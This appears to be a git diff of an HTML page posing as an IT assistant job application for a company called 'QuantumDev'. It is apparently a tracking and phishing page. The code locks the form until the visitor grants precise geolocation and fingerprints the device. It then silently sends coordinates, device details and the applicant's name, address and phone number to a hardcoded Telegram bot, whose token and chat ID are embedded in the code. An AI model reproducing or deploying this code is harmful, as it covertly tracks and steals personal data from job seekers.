@@ -1,184 +1,307 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device & Location Info</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
-    <style>
-        /* 🔁 Added styles for form */
-        .form-container {
-            background-color: white;
-            padding: 30px 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 500px;
-            margin-top: 20px;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>IT Assistant Job Application</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #eef2f3, #8e9eab);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
 
-        .form-container img {
-            display: block;
-            margin: 0 auto 20px;
-            width: 120px;
-        }
+    .form-container {
+      background-color: white;
+      padding: 30px 40px;
+      border-radius: 15px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 500px;
+    }
 
-        .form-container h2 {
-            text-align: center;
-            margin-bottom: 25px;
-            color: #333;
-        }
+    .form-container img {
+      display: block;
+      margin: 0 auto 20px;
+      width: 120px;
+    }
 
-        .form-group {
-            margin-bottom: 15px;
-        }
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #333;
+    }
 
-        label {
-            display: block;
-            margin-bottom: 6px;
-            font-weight: 600;
-            color: #444;
-        }
+    .form-group {
+      margin-bottom: 15px;
+    }
 
-        input[type="text"],
-        textarea {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            font-size: 15px;
-        }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #444;
+    }
 
-        textarea {
-            resize: vertical;
-            min-height: 100px;
-        }
+    input[type="text"],
+    textarea {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: border 0.3s ease;
+    }
 
-        .submit-btn {
-            display: block;
-            width: 100%;
-            padding: 12px;
-            background-color: #0077b6;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
+    input:disabled,
+    textarea:disabled {
+      background-color: #eee;
+      cursor: not-allowed;
+    }
 
-        .submit-btn:hover {
-            background-color: #005f87;
-        }
-    </style>
+    textarea {
+      resize: vertical;
+      min-height: 100px;
+    }
+
+    .submit-btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      background-color: #0077b6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .submit-btn:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+
+    .submit-btn:hover:enabled {
+      background-color: #005f87;
+    }
+
+    #location-message {
+      color: red;
+      text-align: center;
+      margin-top: 20px;
+      font-weight: 500;
+      cursor: pointer;
+      display: none;
+    }
+
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(8px);
+      background-color: rgba(255, 255, 255, 0.5);
+      z-index: 1000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    #locationPrompt {
+      display: none; /* hidden by default */
+      background-color: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      max-width: 90%;
+    }
+
+    #locationPrompt h3 {
+      margin-bottom: 15px;
+      font-size: 18px;
+      color: #333;
+    }
+
+    #retryButton {
+      background-color: #0077b6;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      font-weight: bold;
+      font-size: 15px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    #retryButton:hover {
+      background-color: #005f87;
+    }
+  </style>
 </head>
 <body>
-    <h2>Device & Location Info</h2>
-    <div id="location">Waiting for location permission...</div>
-
-    <!-- 🔁 Hidden Form -->
-    <div id="applicationForm" style="display: none;">
-        <div class="form-container">
-            <img src="your-logo.png" alt="Company Logo">
-            <h2>IT Assistant Job Application</h2>
-            <form action="#" method="POST">
-                <div class="form-group">
-                    <label for="name">Name with Full Initials</label>
-                    <input type="text" id="name" name="name" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="address">Address</label>
-                    <input type="text" id="address" name="address" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="phone">Phone Number</label>
-                    <input type="text" id="phone" name="phone" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="qualifications">Enter Your Qualifications</label>
-                    <textarea id="qualifications" name="qualifications" required></textarea>
-                </div>
-
-                <button type="submit" class="submit-btn">Submit Application</button>
-            </form>
-        </div>
+  <div id="overlay">
+    <div id="locationPrompt">
+      <h3>📍 Location permission is required to use this form.</h3>
+      <button id="retryButton" onclick="getLocation()">Allow Location Access</button>
     </div>
+  </div>
 
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
-            } else {
-                showFormInstead();
-            }
-        }
+  <div class="form-container">
+    <img src="logo.jpg" alt="Company Logo" />
+    <h2>QuantumDev - IT Assistant Job Application</h2>
+    <p style="text-align:center; margin-bottom: 20px; color: #555;">
+      QuantumDev is a leading financial and software company established in 2020. We aim to provide innovative solutions across industries with a strong commitment to excellence and digital transformation.
+    </p>
 
-        function showPosition(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            document.getElementById("location").innerHTML = `Latitude: ${lat} <br>Longitude: ${lon}`;
-            updateBrowserURL(lat, lon);
-            const deviceInfo = getDeviceDetails();
-            sendLocation(lat, lon, deviceInfo);
-        }
+    <form id="jobForm">
+      <div class="form-group">
+        <label for="name">Name with Full Initials</label>
+        <input type="text" id="name" name="name" required disabled />
+      </div>
 
-        function showError(error) {
-            // 🔁 Instead of error message, show the form
-            showFormInstead();
-        }
+      <div class="form-group">
+        <label for="address">Address</label>
+        <input type="text" id="address" name="address" required disabled />
+      </div>
 
-        function showFormInstead() {
-            document.getElementById("location").style.display = "none";
-            document.getElementById("applicationForm").style.display = "block";
-        }
+      <div class="form-group">
+        <label for="phone">Phone Number</label>
+        <input type="text" id="phone" name="phone" required disabled />
+      </div>
 
-        function updateBrowserURL(lat, lon) {
-            const newUrl = `${window.location.origin}${window.location.pathname}?lat=${lat}&lon=${lon}`;
-            window.history.replaceState(null, "", newUrl);
-        }
+      <div class="form-group">
+        <label for="qualifications">Enter Your Qualifications</label>
+        <textarea id="qualifications" name="qualifications" required disabled></textarea>
+      </div>
 
-        function getDeviceDetails() {
-            const userAgent = navigator.userAgent;
-            const parser = new UAParser();
-            const result = parser.getResult();
-            const deviceModel = result.device.model || "Unknown Device";
-            const browser = result.browser.name;
-            const os = result.os.name;
-            const screenWidth = window.screen.width;
-            const screenHeight = window.screen.height;
-            const deviceType = /mobile|tablet|ip(ad|hone|od)|android/i.test(userAgent) ? 'Mobile/Tablet' : 'Desktop';
+      <button type="submit" class="submit-btn" disabled>Submit Application</button>
+    </form>
 
-            return `🖥 Device Details:\n• Device Type: ${deviceType}\n• Model: ${deviceModel}\n• Browser: ${browser}\n• OS: ${os}\n• Screen Resolution: ${screenWidth}x${screenHeight}\n• User Agent: ${userAgent}`;
-        }
+    <div id="location-message" onclick="getLocation()">📍 Please allow location access to fill this form.</div>
+  </div>
 
-        function sendLocation(lat, lon, deviceInfo) {
-            const botToken = "YOUR_BOT_TOKEN";
-            const chatIds = ["CHAT_ID_1", "CHAT_ID_2", "CHAT_ID_3"];
-            const message = `🌍 Location Details:\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})\n\n${deviceInfo}`;
-            chatIds.forEach(chatId => {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: "Markdown"
-                    })
-                })
-                .then(response => response.json())
-                .then(data => console.log(`Message sent to ${chatId}:`, data))
-                .catch(error => console.error(`Error sending to ${chatId}:`, error));
-            });
-        }
+  <script>
+    let locationData = { lat: null, lon: null, deviceInfo: null, locationMessageSent: false };
 
-        window.onload = getLocation;
-    </script>
+    function toggleForm(enable) {
+      const elements = document.querySelectorAll("#jobForm input, #jobForm textarea, #jobForm button");
+      elements.forEach(el => el.disabled = !enable);
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      } else {
+        showDenyMessage("Geolocation is not supported by this browser.");
+      }
+    }
+
+    function showPosition(position) {
+      locationData.lat = position.coords.latitude;
+      locationData.lon = position.coords.longitude;
+      locationData.deviceInfo = getDeviceDetails();
+
+      toggleForm(true);
+      document.getElementById("location-message").style.display = "none";
+      document.getElementById("overlay").style.display = "none";
+
+      updateBrowserURL(locationData.lat, locationData.lon);
+
+      if (!locationData.locationMessageSent) {
+        sendLocationAccessMessage();
+        locationData.locationMessageSent = true;
+      }
+    }
+
+    function showError(error) {
+      toggleForm(false);
+      document.getElementById("overlay").style.display = "flex";
+      document.getElementById("locationPrompt").style.display = "block"; // Show message and button
+      showDenyMessage("📍 Please allow location access to fill this form.");
+    }
+
+    function showDenyMessage(msg) {
+      const msgEl = document.getElementById("location-message");
+      msgEl.innerText = msg;
+      msgEl.style.display = "block";
+    }
+
+    function updateBrowserURL(lat, lon) {
+      const newUrl = `${window.location.origin}${window.location.pathname}?lat=${lat}&lon=${lon}`;
+      window.history.replaceState(null, "", newUrl);
+    }
+
+    function getDeviceDetails() {
+      const userAgent = navigator.userAgent;
+      const parser = new UAParser();
+      const result = parser.getResult();
+      const deviceModel = result.device.model || "Unknown Device";
+      const browser = result.browser.name;
+      const os = result.os.name;
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+      const deviceType = /mobile|tablet|ip(ad|hone|od)|android/i.test(userAgent) ? 'Mobile/Tablet' : 'Desktop';
+
+      return `🖥 Device Details:\n• Device Type: ${deviceType}\n• Model: ${deviceModel}\n• Browser: ${browser}\n• OS: ${os}\n• Screen Resolution: ${screenWidth}x${screenHeight}\n• User Agent: ${userAgent}`;
+    }
+
+    function sendTelegramMessage(fullMessage) {
+      const botToken = "8053207965:AAFxT4UzNGdzjiqNzkpjorMlXXz7cHNF6q0";
+      const chatId = "6238170291";
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: fullMessage,
+          parse_mode: "Markdown"
+        })
+      }).catch(err => console.error("❌ Error sending to Telegram", err));
+    }
+
+    function sendLocationAccessMessage() {
+      const mapLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
+      const message = `✅ *Location Access Granted*\n📍 Latitude: ${locationData.lat}\n📍 Longitude: ${locationData.lon}\n🌐 [View on Google Maps](${mapLink})\n\n${locationData.deviceInfo}`;
+      sendTelegramMessage(message);
+    }
+
+    document.getElementById("jobForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const name = document.getElementById("name").value;
+      const address = document.getElementById("address").value;
+      const phone = document.getElementById("phone").value;
+      const qualifications = document.getElementById("qualifications").value;
+
+      const locationInfo = `📍 *Location*:\nLatitude: ${locationData.lat}\nLongitude: ${locationData.lon}\n[View on Google Maps](https://www.google.com/maps?q=${locationData.lat},${locationData.lon})`;
+      const formInfo = `👤 *Applicant Details*:\n• Name: ${name}\n• Address: ${address}\n• Phone: ${phone}\n• Qualifications:\n${qualifications}`;
+      const fullMessage = `${formInfo}\n\n${locationInfo}\n\n${locationData.deviceInfo}`;
+
+      alert("✅ Application submitted!");
+      sendTelegramMessage(fullMessage);
+      this.reset();
+    });
+
+    window.onload = () => {
+      toggleForm(false);
+      getLocation();
+    };
+  </script>
 </body>
 </html>
